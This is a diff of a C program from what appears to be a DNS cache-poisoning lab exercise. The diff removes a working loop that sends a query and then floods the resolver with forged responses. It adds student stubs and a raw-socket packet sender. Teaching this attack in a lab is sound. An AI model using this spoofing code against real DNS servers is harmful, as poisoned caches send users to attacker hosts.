@@ -58,23 +58,64 @@ int main()
 		char name[5];
 		for (int k=0; k<5; k++)	name[k] = a[rand()%26];
 				
-		/* Step 1. Send  a DNS request to the targeted local DNS server
-				   This will trigger it to send out DNS queries */
-		memcpy(ip_req+41, name, 5);		// Modify the name in the question field (ofset=41)
-		send_dns_request(ip_req, n_req);// Send the DNS request
-		printf("attempt #%ld. request is [%.5s.example.com]\n, transaction ID is: [%hu]\n", ++i, name, transaction_id);
-		
-		
-		// Step 2. Send spoofed responses to the trageted local DNS server
-		memcpy(ip_resp+41, name, 5); // Modify the name in the question field (offset=41)
-		memcpy(ip_resp+64, name, 5); // Modify the name in the answer field (offset=64)
-		for(int j=0; j<14000; j++)
-		{
-			transaction_id = (rand()%65536)+1;
-			unsigned short id;
-			id = htons(j);
-			memcpy(ip_resp+28, &id, 2);
-			send_dns_response(ip_resp, n_resp);
-		}
-	}
+
+    //##################################################################
+    /* Step 1. Send a DNS request to the targeted local DNS server
+              This will trigger it to send out DNS queries */
+
+    // ... Students should add code here.
+
+
+    // Step 2. Send spoofed responses to the targeted local DNS server.
+    
+    // ... Students should add code here.
+    
+    //##################################################################
+  }
+}
+
+
+/* Use for sending DNS request.
+ * Add arguments to the function definition if needed.
+ * */
+void send_dns_request()
+{
+  // Students need to implement this function
+}
+
+
+/* Use for sending forged DNS response.
+ * Add arguments to the function definition if needed.
+ * */
+void send_dns_response()
+{
+  // Students need to implement this function
+}
+
+
+/* Send the raw packet out 
+ *    buffer: to contain the entire IP packet, with everything filled out.
+ *    pkt_size: the size of the buffer.
+ * */
+void send_raw_packet(char * buffer, int pkt_size)
+{
+  struct sockaddr_in dest_info;
+  int enable = 1;
+
+  // Step 1: Create a raw network socket.
+  int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+
+  // Step 2: Set socket option.
+  setsockopt(sock, IPPROTO_IP, IP_HDRINCL,
+	     &enable, sizeof(enable));
+
+  // Step 3: Provide needed information about destination.
+  struct ipheader *ip = (struct ipheader *) buffer;
+  dest_info.sin_family = AF_INET;
+  dest_info.sin_addr = ip->iph_destip;
+
+  // Step 4: Send the packet out.
+  sendto(sock, buffer, pkt_size, 0,
+       (struct sockaddr *)&dest_info, sizeof(dest_info));
+  close(sock);
 }
